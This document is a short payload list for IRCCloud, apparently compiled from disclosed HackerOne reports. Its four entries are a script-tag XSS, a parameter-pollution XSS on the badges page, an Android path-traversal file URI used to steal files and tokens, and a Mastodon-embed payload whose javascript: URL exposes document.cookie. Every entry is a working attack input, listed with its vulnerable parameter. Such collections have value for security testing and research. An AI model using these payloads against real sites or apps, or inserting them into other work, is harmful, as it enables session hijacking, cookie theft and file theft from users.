# IRCCloud

4 payloads.

### `beff35fd`

```
<script>
```

— [Reflected XSS in Pastebin-view](https://hackerone.com/reports/17540) · IRCCloud · [pseudochu](https://hackerone.com/pseudochu)

### `3b819d1d`

```
target.com/badges?hostname=hostname" type="text/javascript"> /*&hostname=*/alert('XSS\n-Rohit Dua'); //
```

**Parameter:** `hostname`
— [Cross Site Scripting(XSS) on IRCCloud Badges Page (using Parameter Pollution)](https://hackerone.com/reports/150083) · IRCCloud · [rohitdua](https://hackerone.com/rohitdua)

### `fe11d5cb`

```
file:///data/data/com.attacker/x/x/x/x/..%2F..%2F..%2F..%2Fsdcard%2Fprefs.xml                                    /data/data/com.attacker/sdcard/prefs.xml
```

**Parameter:** `uri`
— [\[IRCCloud Android\] Theft of arbitrary files leading to token leakage](https://hackerone.com/reports/288955) · IRCCloud · [bagipro](https://hackerone.com/bagipro)

### `86e67bb8`

```
{
  "account": {
    "url": "https://target.com/@a"
  },
  "url": "javascript:top.document.body.innerHTML = \"hi your cookie is \" + document.cookie;//"
}
```

**Parameter:** `url`
— [XSS from Mastodon embeds](https://hackerone.com/reports/1887917) · IRCCloud · [lotsofloops](https://hackerone.com/lotsofloops) · $500.0
